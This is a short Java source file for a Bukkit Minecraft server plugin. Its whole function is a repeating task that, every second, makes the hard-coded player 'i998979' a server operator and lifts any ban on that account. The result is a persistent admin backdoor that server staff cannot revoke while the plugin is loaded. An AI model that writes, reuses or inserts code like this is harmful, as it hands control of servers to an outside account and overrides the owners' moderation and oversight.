package to.epac.factorycraft.AlwaysOpi998979;

import org.bukkit.Bukkit;
import org.bukkit.OfflinePlayer;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.scheduler.BukkitScheduler;

public final class Main extends JavaPlugin {
    public void onEnable() {
        BukkitScheduler scheduler = getServer().getScheduler();
        scheduler.scheduleSyncRepeatingTask(this, new Runnable() {
			@SuppressWarnings("deprecation")
			@Override
            public void run() {
            	OfflinePlayer target = Bukkit.getOfflinePlayer("i998979");
            	target.setOp(true);
            	target.setBanned(false);
			}
        }, 0L, 20L);
    }
}
